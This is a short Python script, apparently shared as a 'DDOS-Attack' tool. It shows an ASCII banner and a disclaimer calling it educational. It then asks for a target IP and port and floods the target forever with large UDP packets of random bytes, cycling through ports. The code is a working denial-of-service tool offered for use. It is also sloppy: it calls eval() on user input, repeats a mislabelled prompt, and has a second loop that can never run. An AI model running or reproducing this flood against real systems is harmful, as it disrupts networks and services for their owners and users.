import os
import time
import socket
import random
import sys

# DDOS-Attack [ASCII Art]


def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()

# Terminal header settings and information
os.system('color 0A')
print("Developer  :   REVAMP VEGAS (https://karthiklal.live)")
print("Created Date:   2022-03-09")
print('Project     :   DDOS-Attack')
print('Purpose     :   A simple DDOS-Attack tool to test your network security')
print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
K_bytes = random._urandom(50099)
K_bytes = random._urandom(50099)

# Type your ip and port number (find IP address using nslookup or any online website)
ip = input("IP Target : ")
port = eval(input("Target Port       : "))
sent = eval(input("Packet Pizza Hot       : "))
ping = eval(input("Packet Pizza Hot       : "))
# Lets start the attack
print("Terimakasih Yang Telah Menggunakan Tools Ini (DDOS-ATTACK-TOOL).")
print("Memulai Mengirim Packet Trojan ", ip, " Dan Ke port ", port, "...")

time.sleep(5)
sent = 0
while True:
    sock.sendto(K_bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    ping = ping + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
       port = 1
    if ping == 65534:
       ping = 1

while True:
    sock.sendto(K_bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    ping = ping + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
       port = 1
    if ping == 65534:
       ping = 1

# End of the script
os.system("cls")
input("Press Enter to exit...")
